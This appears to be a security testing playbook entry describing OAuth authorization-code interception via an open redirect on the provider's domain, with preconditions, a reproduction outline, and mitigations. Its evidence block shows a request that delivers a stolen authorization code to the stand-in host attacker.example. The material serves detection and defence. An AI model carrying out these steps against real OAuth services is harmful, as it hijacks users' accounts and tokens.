# OAuth Open Redirect -> Authorization Code Interception

## Attack Surface

OAuth providers that permit redirect URLs matching broad patterns and host open redirects.

## Preconditions

- Open redirect exists on trusted OAuth domain
- OAuth client allows redirect prefix/wildcard match
- Authorization code flow enabled

## Reproduction Outline

1. Confirm open redirect endpoint (`/redirect?url=...`)
2. Supply redirect endpoint as `redirect_uri` in authorize request
3. Complete auth flow and capture redirected `code` at attacker endpoint
4. Exchange code for token if client configuration allows

## Evidence Pattern

```http
GET /?code=AUTH_CODE HTTP/1.1
Host: attacker.example
Referer: https://auth.target.com/redirect?url=https://attacker.example
```

## True Positive vs False Positive

- **True positive:** authorization code reaches attacker-controlled endpoint
- **False positive:** provider rejects redirect URI or strips sensitive params

## Mitigation

- Require exact redirect URI matches
- Remove open redirects from auth domain
- Bind auth code to strict PKCE + client verification rules
